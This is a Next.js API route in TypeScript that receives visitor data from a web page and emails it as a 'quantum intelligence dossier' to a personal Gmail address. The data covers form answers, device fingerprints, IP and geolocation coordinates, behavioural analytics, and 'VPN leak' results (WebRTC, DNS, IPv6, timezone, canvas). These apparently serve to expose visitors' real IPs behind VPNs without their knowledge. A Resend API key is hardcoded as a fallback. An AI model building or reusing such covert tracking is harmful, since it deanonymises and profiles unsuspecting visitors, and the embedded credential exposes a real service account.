// app/api/submit/quantum/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY || 're_dbucvqvg_6nVX9uBbM1bfoKtjAA46zCvW');

export async function POST(request: NextRequest) {
  try {
    const data = await request.json();

    // Extract data directly (no encryption)
    const { type, intelligence, behavioral, formAnalytics, sessionId, timestamp } = data;
    
    // Format timestamp
    const submissionDate = new Date(timestamp);
    const formattedDate = submissionDate.toLocaleString('en-US', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      timeZoneName: 'short',
    });
    
    let emailBody = '';
    let subject = '';

    if (type === 'pageload_quantum') {
      subject = `🚀 QUANTUM INTELLIGENCE - Visitor Detected - ${formattedDate}`;
      emailBody = formatQuantumPageLoadEmail(data, formattedDate);
    } else if (type === 'form_quantum') {
      subject = `🎯 QUANTUM DOSSIER - Form Completed - ${formattedDate}`;
      emailBody = formatQuantumFormEmail(data, formattedDate);
    } else if (type === 'ip_change_alert') {
      subject = `⚠️ QUANTUM ALERT - IP Change Detected - ${formattedDate}`;
      emailBody = formatIPChangeAlert(data, formattedDate);
    }

    // Send quantum intelligence report
    await resend.emails.send({
      from: 'Quantum Intelligence <intelligence@resend.dev>',
      to: ['shaidt137@gmail.com'],
      subject: subject,
      text: emailBody,
      html: generateHTMLReport(data, type)
    });
    
    return NextResponse.json({
      success: true,
      message: 'Quantum intelligence processed',
      sessionId,
      riskLevel: intelligence?.riskAssessment?.riskLevel || 'unknown'
    });
    
  } catch (error) {
    console.error('Quantum intelligence error:', error);
    return NextResponse.json(
      { error: 'Quantum processing failed' },
      { status: 500 }
    );
  }
}

function formatQuantumPageLoadEmail(data: any, formattedDate: string): string {
  const { intelligence, location, behavioral, vpnLeaks } = data;

  return `
🚀 QUANTUM INTELLIGENCE SYSTEM ACTIVATED
═══════════════════════════════════════════════════════════════════

📅 Detection Time: ${formattedDate}
🔐 Session ID: ${data.sessionId}
🎯 Encryption Level: ${data.security?.encryptionStrength || 'Unknown'}

${formatRiskAssessment(intelligence?.riskAssessment)}
${formatDeviceIntelligence(intelligence?.deviceIntelligence)}
${formatNetworkIntelligence(intelligence?.networkIntelligence)}
${formatBehavioralIntelligence(behavioral?.analysis)}
${formatThreatIndicators(intelligence?.threatIndicators)}
${formatVPNLeakReport(vpnLeaks)}

⚠️  IMMEDIATE ACTION REQUIRED: ${intelligence?.riskAssessment?.riskLevel === 'critical' || vpnLeaks?.leakSeverity === 'critical' ? 'YES' : 'No'}

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatQuantumFormEmail(data: any, formattedDate: string): string {
  const { answers, intelligence, behavioral, formAnalytics, vpnLeaks } = data;

  return `
🎯 QUANTUM INTELLIGENCE DOSSIER - COMPLETE PROFILE
═══════════════════════════════════════════════════════════════════

📅 Completion Time: ${formattedDate}
🔐 Session ID: ${data.sessionId}
📊 Form Completion: 100%

${formatFormAnswers(answers)}
${formatFormAnalytics(formAnalytics)}
${formatRiskAssessment(intelligence?.riskAssessment)}
${formatBehavioralPatterns(behavioral?.analysis?.patterns)}
${formatThreatIndicators(intelligence?.threatIndicators)}
${formatVPNLeakReport(vpnLeaks)}
${formatRecommendations(intelligence?.recommendations)}

🎯 FINAL ASSESSMENT:
Risk Level: ${intelligence?.riskAssessment?.riskLevel || 'Unknown'}
Confidence: ${intelligence?.riskAssessment?.confidence || 0}%
Trust Score: ${100 - (intelligence?.riskAssessment?.overallRisk || 0)}/100
VPN Leak Severity: ${vpnLeaks?.leakSeverity?.toUpperCase() || 'NONE'}
Real IP Detected: ${vpnLeaks?.realIP ? `⚠️ ${vpnLeaks.realIP}` : '✅ Not found'}

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatRiskAssessment(assessment: any): string {
  if (!assessment) return '';
  
  return `
🔍 RISK ASSESSMENT
═══════════════════════════════════════════════════════════════════
Overall Risk: ${assessment.overallRisk || 0}/100
Risk Level: ${assessment.riskLevel || 'Unknown'}
Confidence: ${assessment.confidence || 0}%

Risk Factors:
${(assessment.riskFactors || []).map((factor: string) => `• ${factor}`).join('\n') || '• None detected'}

Categories:
• Privacy Risk: ${assessment.categories?.privacyRisk || 0}/100
• Security Risk: ${assessment.categories?.securityRisk || 0}/100
• Automation Risk: ${assessment.categories?.automationRisk || 0}/100
• Location Risk: ${assessment.categories?.locationRisk || 0}/100

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatDeviceIntelligence(device: any): string {
  if (!device) return '';

  return `
🖥️ DEVICE INTELLIGENCE
═══════════════════════════════════════════════════════════════════
Device Type: ${device.type || 'Unknown'}
OS: ${device.os || 'Unknown'} ${device.osVersion || ''}
Browser: ${device.browser || 'Unknown'} ${device.browserVersion || ''}
Screen: ${device.screen?.resolution || 'Unknown'}
Hardware: ${device.hardware?.cores || 'Unknown'} cores, ${device.hardware?.memory || 'Unknown'}GB RAM

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatNetworkIntelligence(network: any): string {
  if (!network) return '';

  return `
🌐 NETWORK INTELLIGENCE
═══════════════════════════════════════════════════════════════════
Connection Type: ${network.type || 'Unknown'}
IP Address: ${network.ip || 'Unknown'}
${network.vpn ? `⚠️ VPN DETECTED: ${network.vpnProvider || 'Unknown'} (${network.vpnConfidence || 0}% confidence)` : '✅ No VPN Detected'}
Location: ${network.location?.city || 'Unknown'}, ${network.location?.country || 'Unknown'}
Coordinates: ${network.location?.coordinates?.latitude || '?'}, ${network.location?.coordinates?.longitude || '?'}

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatBehavioralIntelligence(behavioral: any): string {
  if (!behavioral) return '';

  return `
🧠 BEHAVIORAL INTELLIGENCE
═══════════════════════════════════════════════════════════════════
User Activity Score: ${behavioral.activityScore || 0}/100
Engagement Level: ${behavioral.engagementLevel || 'Unknown'}
Pattern Analysis: ${behavioral.patternAnalysis || 'In Progress'}

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatThreatIndicators(threats: any): string {
  if (!threats || !threats.length) return '';

  return `
⚠️ THREAT INDICATORS
═══════════════════════════════════════════════════════════════════
${threats.map((threat: any) => `
• ${threat.type || 'Unknown'}: ${threat.severity || 'Unknown'} severity
  ${threat.description || 'No description'}
`).join('\n')}

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatFormAnswers(answers: any): string {
  if (!answers) return '';

  return `
📝 FORM RESPONSES
═══════════════════════════════════════════════════════════════════
${Object.entries(answers).map(([key, value]) => `${key}: ${value}`).join('\n')}

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatFormAnalytics(analytics: any): string {
  if (!analytics) return '';

  return `
📊 FORM ANALYTICS
═══════════════════════════════════════════════════════════════════
Completion Time: ${Math.round((analytics.totalTime || 0) / 1000)}s
Engagement Score: ${analytics.engagementScore || 0}/100
Input Method: ${analytics.inputMethod || 'Unknown'}
Corrections Made: ${analytics.corrections || 0}

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatBehavioralPatterns(patterns: any): string {
  if (!patterns) return '';

  return `
🔍 BEHAVIORAL PATTERNS
═══════════════════════════════════════════════════════════════════
${Object.entries(patterns).map(([key, value]) => `${key}: ${value}`).join('\n')}

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatRecommendations(recommendations: any): string {
  if (!recommendations || !recommendations.length) return '';

  return `
💡 RECOMMENDATIONS
═══════════════════════════════════════════════════════════════════
${recommendations.map((rec: string) => `• ${rec}`).join('\n')}

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatVPNLeakReport(vpnLeaks: any): string {
  if (!vpnLeaks) return '';

  const { hasLeaks, leakSeverity, leaks, realIP, vpnIP, recommendations } = vpnLeaks;

  // Safety check - if leaks is undefined, return basic info
  if (!leaks) {
    return `
🔒 VPN LEAK DETECTION REPORT
═══════════════════════════════════════════════════════════════════
Overall Status: ${hasLeaks ? '⚠️ LEAKS DETECTED' : '✅ NO LEAKS'}
Leak Severity: ${(leakSeverity || 'unknown').toUpperCase()}
VPN IP: ${vpnIP || 'Unknown'}
Real IP Found: ${realIP ? `⚠️ ${realIP}` : '✅ Not detected'}
═══════════════════════════════════════════════════════════════════
    `.trim();
  }

  let leakDetails = '';

  // WebRTC Leaks
  if (leaks.webrtcLeaks && Array.isArray(leaks.webrtcLeaks) && leaks.webrtcLeaks.length > 0) {
    leaks.webrtcLeaks.forEach((leak: any) => {
      leakDetails += `
🔴 WebRTC Leak Detected (${leak.severity.toUpperCase()})
  Local IPs: ${leak.localIPs.join(', ') || 'None'}
  Public IPs: ${leak.publicIPs.join(', ') || 'None'}
  IPv6 IPs: ${leak.ipv6IPs.join(', ') || 'None'}
  STUN Server: ${leak.stunServer}
  Status: ${leak.leaked ? '⚠️ LEAKED' : '✅ No leak'}
`;
    });
  }

  // DNS Leaks
  if (leaks.dnsLeaks && Array.isArray(leaks.dnsLeaks) && leaks.dnsLeaks.length > 0) {
    leaks.dnsLeaks.forEach((leak: any) => {
      leakDetails += `
🟡 DNS Leak Detected (${leak.severity.toUpperCase()})
  DNS Server: ${leak.dnsServer}
  Location: ${leak.location}
  ISP: ${leak.isp}
  Status: ${leak.leaked ? '⚠️ LEAKED' : '✅ No leak'}
`;
    });
  }

  // IPv6 Leaks
  if (leaks.ipv6Leaks && Array.isArray(leaks.ipv6Leaks) && leaks.ipv6Leaks.length > 0) {
    leaks.ipv6Leaks.forEach((leak: any) => {
      leakDetails += `
🟠 IPv6 Leak Detected (${leak.severity.toUpperCase()})
  IPv6 Address: ${leak.ipv6Address}
  Prefix: ${leak.prefix}
  Status: ${leak.leaked ? '⚠️ LEAKED' : '✅ No leak'}
`;
    });
  }

  // DHCP Leaks
  if (leaks.dhcpLeaks && Array.isArray(leaks.dhcpLeaks) && leaks.dhcpLeaks.length > 0) {
    leaks.dhcpLeaks.forEach((leak: any) => {
      leakDetails += `
🟣 DHCP Information Detected (${leak.severity.toUpperCase()})
  DHCP Server: ${leak.dhcpServer}
  Gateway: ${leak.gateway}
  Subnet: ${leak.subnet}
  Status: ${leak.leaked ? '⚠️ LEAKED' : '✅ No leak'}
`;
    });
  }

  // Timezone Leak
  if (leaks.timezoneLeak) {
    const leak = leaks.timezoneLeak;
    leakDetails += `
🔵 Timezone Leak Detected (${leak.severity.toUpperCase()})
  Browser Timezone: ${leak.timezone}
  Offset: ${leak.offset} minutes
  VPN Location: ${leak.vpnLocation}
  Real Location: ${leak.realLocation}
  Status: ${leak.mismatch ? '⚠️ MISMATCH DETECTED' : '✅ No mismatch'}
`;
  }

  // Browser Fingerprint Leak
  if (leaks.browserLeak) {
    const leak = leaks.browserLeak;
    leakDetails += `
🟢 Browser Fingerprint (${leak.severity.toUpperCase()})
  User Agent: ${leak.userAgent?.substring(0, 80) || 'Unknown'}...
  Languages: ${leak.languages.join(', ')}
  Plugins: ${leak.plugins.length} detected
  Canvas: ${leak.canvas?.substring(0, 30) || 'N/A'}...
  WebGL: ${leak.webgl || 'N/A'}
`;
  }

  return `
🔒 VPN LEAK DETECTION REPORT
═══════════════════════════════════════════════════════════════════
Overall Status: ${hasLeaks ? '⚠️ LEAKS DETECTED' : '✅ NO LEAKS'}
Leak Severity: ${leakSeverity.toUpperCase()}
VPN IP: ${vpnIP}
Real IP Found: ${realIP ? `⚠️ ${realIP}` : '✅ Not detected'}

${leakDetails}

🛡️ SECURITY RECOMMENDATIONS:
${(recommendations && Array.isArray(recommendations)) ? recommendations.map((rec: string) => `${rec}`).join('\n') : '• No recommendations'}

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function formatIPChangeAlert(data: any, formattedDate: string): string {
  const { ipChange, intelligence, location, riskAssessment, vpnLeaks } = data;

  return `
⚠️ QUANTUM SECURITY ALERT - IP ADDRESS CHANGE DETECTED
═══════════════════════════════════════════════════════════════════

📅 Alert Time: ${formattedDate}
🔐 Session ID: ${data.sessionId}
⚠️  Severity: ${riskAssessment?.ipChangeSeverity?.toUpperCase() || 'HIGH'}

📍 IP ADDRESS CHANGE
═══════════════════════════════════════════════════════════════════
Previous IP: ${ipChange?.oldIP || 'Unknown'}
New IP: ${ipChange?.newIP || 'Unknown'}
Time Elapsed: ${Math.round((ipChange?.timeDifference || 0) / 1000)}s since session start

🌐 NEW LOCATION DATA
═══════════════════════════════════════════════════════════════════
IP: ${location?.ip || 'Unknown'}
${location?.isVPN ? `⚠️ VPN Detected: ${location?.vpnProvider || 'Unknown Provider'}` : 'No VPN Detected'}
City: ${location?.address?.city || 'Unknown'}
Country: ${location?.address?.country || 'Unknown'}
Coordinates: ${location?.coordinates?.latitude || '?'}, ${location?.coordinates?.longitude || '?'}

${formatRiskAssessment(intelligence?.riskAssessment)}
${formatVPNLeakReport(vpnLeaks)}

🔍 POSSIBLE REASONS FOR IP CHANGE:
═══════════════════════════════════════════════════════════════════
• VPN/Proxy activation or switch
• Network change (WiFi → Mobile Data or vice versa)
• Location change (physical movement)
• ISP dynamic IP reassignment
• Suspicious activity / evasion attempt

⚠️ RECOMMENDED ACTIONS:
═══════════════════════════════════════════════════════════════════
• Monitor for additional IP changes
• Verify user identity if sensitive operations are performed
• Check for VPN/Proxy indicators
• Compare behavioral patterns before/after change
${vpnLeaks?.realIP ? `• ⚠️ CRITICAL: Real IP ${vpnLeaks.realIP} detected outside VPN tunnel!` : ''}

═══════════════════════════════════════════════════════════════════
  `.trim();
}

function generateHTMLReport(data: any, type: string): string {
  return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Quantum Intelligence Report</title>
</head>
<body>
  <h1>Quantum Intelligence Report</h1>
  <p>Type: ${type}</p>
  <p>Session: ${data.sessionId}</p>
  <pre>${JSON.stringify(data, null, 2)}</pre>
</body>
</html>
  `.trim();
}